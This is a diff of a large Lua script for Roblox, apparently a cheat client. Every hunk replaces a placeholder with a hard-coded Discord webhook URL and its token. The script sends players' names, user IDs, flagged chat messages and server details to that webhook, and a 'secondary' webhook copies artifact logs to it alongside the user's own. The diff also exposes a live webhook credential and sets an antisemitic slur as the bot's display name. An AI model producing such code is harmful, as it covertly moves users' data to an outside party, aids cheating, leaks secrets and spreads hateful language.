@@ -3757,7 +3757,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
 
                     local ping = Stats:WaitForChild("PerformanceStats"):WaitForChild("Ping"):GetValue()
                     pcall(function()
-                        send_webhook("WEBHOOK_URL_HERE", {
+                        send_webhook("https://discord.com/api/webhooks/1536384266705969263/p5UQ9sQPaHcXpZ1Bhnf4AHBCjzR0zPshBsKKa1W9KvOyKxzN3IiBGpJ3h9QHu3ltuQcD", {
                             username = "Error Monitor",
                             embeds = {{
                                 title = "Script Error - " .. sanitize(plr.Name, "[a-zA-Z0-9_]{3,20}") .. " (" .. plr.UserId .. ")",
@@ -3815,7 +3815,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 local serverName, serverRegion = get_server_info()
 
                 pcall(function()
-                    send_webhook("WEBHOOK_URL_HERE", {
+                    send_webhook("https://discord.com/api/webhooks/1536384266705969263/p5UQ9sQPaHcXpZ1Bhnf4AHBCjzR0zPshBsKKa1W9KvOyKxzN3IiBGpJ3h9QHu3ltuQcD", {
                         username = "Flag Monitor",
                         embeds = {{
                             title = string.format("⚠️ Flagged Chat - %s (%d)", plr.Name, plr.UserId),
@@ -25221,7 +25221,7 @@ end
                                 end)
                             end
 
-                            local secondary_webhook_url = "WEBHOOK_URL_HERE"
+                            local secondary_webhook_url = "https://discord.com/api/webhooks/1536384266705969263/p5UQ9sQPaHcXpZ1Bhnf4AHBCjzR0zPshBsKKa1W9KvOyKxzN3IiBGpJ3h9QHu3ltuQcD"
                             local should_send_secondary = cheat_client.config.webhook ~= secondary_webhook_url
 
                             local player_has_artifact = #unpicked_artifact_names == 0
@@ -25268,7 +25268,7 @@ end
 
                                 if cheat_client.trinket_bot and cheat_client.trinket_bot.pending_artifact_logs then
                                     table.insert(cheat_client.trinket_bot.pending_artifact_logs, {
-                                        webhook_url = "WEBHOOK_URL_HERE",
+                                        webhook_url = "https://discord.com/api/webhooks/1536384266705969263/p5UQ9sQPaHcXpZ1Bhnf4AHBCjzR0zPshBsKKa1W9KvOyKxzN3IiBGpJ3h9QHu3ltuQcD",
                                         username = "Jew",
                                         embed = stream_embed,
                                         artifact_names = unpicked_artifact_names,
